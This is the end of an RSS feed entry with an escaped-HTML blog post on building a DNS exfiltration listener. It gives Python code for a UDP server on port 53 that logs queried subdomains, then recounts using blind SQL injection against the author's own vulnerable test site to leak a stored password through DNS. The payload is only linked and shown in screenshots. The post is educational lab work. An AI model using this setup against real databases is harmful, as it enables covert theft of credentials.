&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;testing-and-exploiting&quot;&gt;&lt;a href=&quot;#header-8&quot;&gt;&lt;/a&gt;Testing and Exploiting&lt;/h2&gt;
&lt;p&gt;To make sure that it works, I can run a simple nslookup and see if my listener picks up the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/4.png&quot; alt=&quot;&quot; height=&quot;80%&quot; width=&quot;80%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nslookup failed, but thats expected since for one, we don’t actually have any DNS service running, and second, the requested subdomain doesn’t exist. But as you can see, our server did recieve the request and, most importantly, we can see the subdomain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/5.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploiting&quot;&gt;&lt;a href=&quot;#header-9&quot;&gt;&lt;/a&gt;Exploiting&lt;/h2&gt;
&lt;p&gt;To really fully test our setup, I created a simple vulnerable webserver with a login page connected to a PostgreSQL database that contains login credentials. The webserver is vulnerable to SQL injection, but no output is returned to the user. There’s a few different methods I could use (time-based for example), but why not use DNS exfiltration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/6.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I won’t go into the exploit itself, but you can read about it &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind&quot;&gt;here&lt;/a&gt;. Using Burp, I sent the URL encoded exploit that retrieved the password from the SQL table and sent it as the subdomain in the DNS request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/7.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the listener running on our server, we recieved the DNS request and can see the password that was stored in the PostgreSQL database set as the subdomain!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/8.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-10&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The inspiration for this project was trying to run my own server for DNS exfiltration instead of having to pay for the pro version of BurpSuite, which has a BurpCollaborator that will do this for you. I learned a lot more about DNS through this project, and I hope I was able to help you learn something too!&lt;/p&gt;
</description>
        <pubDate>Wed, 10 Jun 2020 00:00:00 +0000</pubDate>
        <link>//posts/DNS-Exfiltration-Setup/</link>
        <link href="/posts/DNS-Exfiltration-Setup/"/>
        <guid isPermaLink="true">/posts/DNS-Exfiltration-Setup/</guid>
      </item>
    
  </channel>
</rss>
